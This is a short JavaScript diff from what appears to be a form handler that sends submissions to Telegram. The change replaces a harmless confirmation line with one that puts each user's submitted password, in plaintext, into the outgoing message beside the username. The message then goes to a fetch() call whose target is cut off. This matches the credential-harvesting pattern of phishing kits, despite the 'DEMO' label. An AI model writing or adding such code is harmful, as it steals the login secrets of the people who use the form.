@@ -49,7 +49,7 @@ if (form) {
         const telegramMessage =
             "📋 DEMO FORM SUBMISSION\n\n" +
             "Username: " + username + "\n" +
-            "Second field received: Yes";
+            "password: " + password;
 
         try {
             const response = await fetch(
